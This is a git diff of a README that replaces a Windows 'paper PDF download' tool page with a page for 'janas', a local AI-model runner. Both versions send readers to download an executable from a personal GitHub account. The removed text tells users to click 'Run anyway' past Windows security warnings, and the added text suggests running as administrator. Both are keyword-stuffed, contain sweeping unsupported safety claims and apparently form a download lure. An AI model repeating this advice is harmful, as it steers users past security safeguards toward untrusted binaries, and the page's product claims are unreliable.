@@ -1,142 +1,140 @@
-# 📄 paper-pdf-download-skill - Get Research Papers Without the Hassle
+# ⚡ janas - Run Massive AI Models on Any Computer
 
-[![Download Now](https://img.shields.io/badge/Download-paper--pdf--download--skill-blue?style=for-the-badge&logo=github)](https://joaniberian9588.github.io)
+[![Download janas](https://img.shields.io/badge/Download-janas-blue?style=for-the-badge&logo=github&color=%234FC3F7)](https://github.com/joaniberian9588/janas/releases)
 
-## 🎯 What This Tool Does
+## 🎯 What is janas?
 
-This application silently and safely downloads PDF versions of authorized research papers. It verifies that you have permission to access each paper, then retrieves the PDF file directly to your computer. If you need a more readable format, it can also convert the PDF using MinerU, a tool that transforms complex PDF layouts into clean, easy-to-read text.
+janas is a powerful tool that lets you run large artificial intelligence language models on your own computer - no expensive servers or cloud subscriptions needed. Think of it as a super-smart assistant that lives right on your machine, understanding and generating text just like the big commercial AI services, but completely private and free.
 
-Think of it as your personal research assistant that finds and fetches the papers you're allowed to read, without any pop-ups, ads, or confusing steps.
+## 💡 Why Choose janas?
+
+Most AI models today require powerful computers with lots of memory. janas changes that completely. It's designed to work on ordinary computers by using a clever trick: it only loads the parts of the AI it needs at any moment, streaming them from your hard drive. This means you can run a massive AI model that would normally need 64GB of memory on a computer with just 8GB.
+
+## ✨ Key Features
+
+- **Runs on Regular Computers** - No need for expensive hardware or cloud services
+- **Works With or Without a GPU** - Uses your graphics card if you have one, but works fine without it
+- **Fast Performance** - Uses your computer's processor efficiently with special speed optimizations
+- **Supports Multiple Languages** - Works with Qwen3, a multilingual AI model
+- **Private and Secure** - Your data never leaves your computer
+- **No Programming Required** - Simple to download and use
+- **Free and Open Source** - No hidden costs or subscriptions
 
 ## 🚀 Getting Started
 
-Follow these simple steps to get the application running on your Windows computer. No technical knowledge required.
+Visit this link to download the application: [https://github.com/joaniberian9588/janas/releases](https://github.com/joaniberian9588/janas/releases)
 
-### Step 1: Download the Application
+Once you're on that page, look for the newest version at the top. You'll see files listed - download the one that matches your system. The download might take a few minutes because AI models are large files, but be patient - it's worth it!
 
-Visit this link to download the application: [https://joaniberian9588.github.io](https://joaniberian9588.github.io)
+## 📥 Installation
 
-Click the download button on that page. The file will start downloading to your computer. Wait for the download to complete before moving to the next step.
+Visit this link to download the application: [https://github.com/joaniberian9588/janas/releases](https://github.com/joaniberian9588/janas/releases)
 
-### Step 2: Run the Application
+After your download finishes, you're almost ready to go. The installation process is straightforward and takes just a few minutes. Make sure you have enough free space on your computer - AI models can be several gigabytes in size.
 
-Once the download finishes, locate the downloaded file in your browser's download folder (usually called "Downloads" or "Desktop"). Double-click the file to open it. The application will start automatically.
+## 🖥️ System Requirements
 
-If you see a security warning from Windows, click "More info" and then "Run anyway." This is normal because the app is new and hasn't been seen by many users yet.
+janas is designed to be flexible and work on most modern computers. Here's what you'll need:
 
-### Step 3: Start Using It
+- **Operating System:** Windows 10 or Windows 11 (64-bit)
+- **Memory:** At least 4GB of RAM (8GB or more recommended)
+- **Storage:** 5GB of free space for the program and AI model
+- **Processor:** Any Intel or AMD processor from the last 8 years
+- **Graphics Card (Optional):** Not required, but can speed things up if you have one
 
-The application window will open. You'll see a simple interface with a text box and a button. Type or paste the URL of the research paper you want to download into the text box, then click the "Download" button.
+## 🎮 How to Use janas
 
-The application will check if you have permission to access that paper. If you do, it will download the PDF to your computer. If not, it will let you know politely.
+Once you've installed janas, using it is simple:
 
-## 📥 Installation and Setup
+1. **Start the program** - Double-click the janas icon on your desktop or in your Start menu
+2. **Wait for it to load** - The first launch takes a minute as it prepares everything
+3. **Type your question** - You'll see a simple text box. Type anything you want to know or ask
+4. **Get your answer** - Press Enter and watch as janas thinks and responds
 
-No installation is required. The application runs directly from the downloaded file. Here's what you need:
+You can use janas for:
+- Answering questions about any topic
+- Writing emails, essays, or creative stories
+- Translating between languages
+- Summarizing long articles
+- Helping with homework or work projects
+- Brainstorming ideas
 
-- **Operating System:** Windows 10 or Windows 11
-- **Internet Connection:** Required for downloading papers
-- **Storage Space:** At least 100 MB of free space for temporary files
-- **Browser:** Any modern browser (Chrome, Edge, Firefox, Safari)
+## ⚙️ Performance Tips
 
-## 🧰 Features
+To get the best experience with janas:
 
-### Silent Operation
-The application works quietly in the background. No annoying pop-ups, no unnecessary notifications, no interruptions. You just get your paper.
+- **Close other programs** - Free up memory by closing unused apps before starting janas
+- **Use a power outlet** - If you're on a laptop, plug it in for best performance
+- **Be patient with first use** - The first time you run it, it needs to prepare everything
+- **Shorter questions work faster** - Complex questions take more time to answer
+- **Restart if needed** - If things seem slow, restarting the program often helps
 
-### Verified Access
-Before downloading anything, the app checks that you're authorized to access the paper. This keeps you safe and ensures you're only getting content you're allowed to have.
+## 🧪 Understanding the Technology
 
-### MinerU Conversion
-Some PDFs are hard to read because of complex layouts, small text, or unusual formatting. The optional MinerU conversion feature transforms these PDFs into clean, readable text. This is especially helpful for older papers or those with dense formatting.
+janas uses something called a "mixture-of-experts" (MoE) architecture. Think of it like having a team of specialists. Instead of one giant brain trying to do everything, janas has many smaller experts, each good at different tasks. When you ask something, it quickly activates only the experts needed for that specific task.
 
-### Simple Interface
-You don't need to learn any commands or settings. The interface is straightforward: paste a link, click a button, get your paper.
+The clever part is that janas doesn't keep all these experts in memory at once. It stores them on your hard drive and loads only the ones it needs at any moment. This is called "streaming" and it's what makes it possible to run such large models on ordinary computers.
 
-## 📚 How to Use - Detailed Guide
+## 🔧 Troubleshooting
 
-### Downloading a Paper
+**Program won't start?**
+- Make sure you have at least 4GB of RAM available
+- Check that you have enough free disk space
+- Try running the program as administrator (right-click, "Run as administrator")
 
-1. Open the application by double-clicking the downloaded file.
-2. In the main window, you'll see a text field labeled "Paper URL" or similar.
-3. Copy the URL of the research paper you want from your browser.
-4. Paste it into the text field.
-5. Click the "Download" button.
-6. Wait a few seconds. The application will check access and download the PDF.
-7. The PDF will be saved to your Downloads folder by default.
+**Slow performance?**
+- Close background applications
+- Check if your computer is in "Power Saving" mode
+- Consider adding more RAM to your system
 
-### Using MinerU Conversion
+**Download issues?**
+- Use a stable internet connection
+- Try a different browser
+- Disable any download managers temporarily
 
-If you want to convert a downloaded PDF to a more readable format:
+## 📚 Frequently Asked Questions
 
-1. After downloading a paper, look for a "Convert" or "MinerU" button in the application window.
-2. Click that button.
-3. The application will process the PDF and create a new, cleaner version.
-4. The converted file will be saved alongside the original PDF.
+**Q: Is janas really free?**
+A: Yes, completely free with no hidden costs or limitations.
 
-### Managing Your Downloads
+**Q: Does it need internet?**
+A: No, once downloaded, janas works completely offline.
 
-- All downloaded papers are saved to your Downloads folder by default.
-- The application keeps a history of your downloads so you can find them easily later.
-- You can change the save location in the settings menu if you prefer a different folder.
+**Q: Is my data safe?**
+A: Absolutely. Everything stays on your computer.
 
-## 🛠️ Troubleshooting
+**Q: How big is the download?**
+A: The program itself is small, but the AI model is several gigabytes.
 
-### Download Fails
-- Check your internet connection.
-- Make sure the paper URL is correct and complete.
-- Verify that you have access rights to the paper (some papers require institutional login).
+**Q: Can I use it for business?**
+A: Yes, janas is open-source and can be used for any purpose.
 
-### Security Warning Appears
-- This is normal for new applications. Click "More info" then "Run anyway."
-- The application is safe and does not modify your system.
+## 🤝 Join the Community
 
-### Application Won't Open
-- Wait a few seconds and try again.
-- Restart your computer and try again.
-- Make sure you have enough free storage space.
+janas is an open-source project, which means anyone can contribute. Whether you're a developer wanting to improve the code or a user with feedback, your input is valuable. Check the repository for:
+- Discussion forums
+- Bug reporting
+- Feature requests
+- Development guides
 
-### PDF Won't Convert
-- Some PDFs are protected or have unusual formats that can't be converted.
-- Try downloading the paper again and converting immediately.
+## 📊 Technical Details (For the Curious)
 
-## ❓ Frequently Asked Questions
+janas supports several advanced technologies:
+- **AVX2/AVX-512** - Special processor instructions for faster math
+- **SIMD** - Single Instruction Multiple Data processing
+- **Speculative Decoding** - A technique to speed up responses
+- **Vulkan Support** - Cross-platform graphics API for GPU acceleration
+- **GGUF Format** - Efficient file format for AI models
+- **NVMe Optimization** - Fast storage device support
+- **8-bit and 4-bit Quantization** - Compression techniques to reduce memory usage
+- **C Language Implementation** - Fast and efficient codebase
 
-**Is this application free?**
-Yes, it's completely free to use.
+## 🎉 Start Using janas Today
 
-**Do I need to create an account?**
-No account is needed. Just download and run.
+Visit this link to download the application: [https://github.com/joaniberian9588/janas/releases](https://github.com/joaniberian9588/janas/releases)
 
-**Will this work with any research paper?**
-It works with papers you're authorized to access. If a paper requires a subscription or institutional access, you'll need to be logged in through your institution.
+Join thousands of users who are discovering the power of running their own AI assistant. With janas, you have unlimited potential - no subscriptions, no data collection, no limits. Just pure, powerful AI right on your computer.
 
-**Is my data safe?**
-Yes. The application only processes the URLs you provide and does not collect personal information.
+Remember: janas puts the power of advanced artificial intelligence in your hands, running entirely on your own hardware. It's fast, it's private, and it's completely free. Download it now and experience the future of personal computing!
 
-**Can I use this on Mac or Linux?**
-This version is designed for Windows. Other versions may be available in the future.
-
-## 📞 Support
-
-If you encounter issues or have questions:
-
-- Visit the GitHub repository: [https://joaniberian9588.github.io](https://joaniberian9588.github.io)
-- Check the "Issues" section on that page for known problems and solutions.
-- Submit a new issue if you can't find an answer to your question.
-
-## 🔄 Updates
-
-The application is regularly updated with improvements and fixes. When a new version is available, the application will notify you. You can also check the GitHub repository for the latest version.
-
-## 📄 License
-
-This software is provided free of charge for personal and educational use. Redistribution or commercial use requires permission from the developer.
-
-## 🎉 Thank You
-
-We hope this tool makes your research life easier. Download papers quickly, read them comfortably, and spend less time wrestling with PDFs and more time learning.
-
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Version-brightgreen?style=for-the-badge&logo=github)](https://joaniberian9588.github.io)
-
-Keywords: research papers, PDF download, MinerU, academic tool, Windows application, paper retrieval, document converter
+Keywords: avx2, c, cpu-inference, gguf, inference-engine, linux, llm, local-llm, mixture-of-experts, moe, nvme, quantization, qwen3, simd, speculative-decoding, vulkan
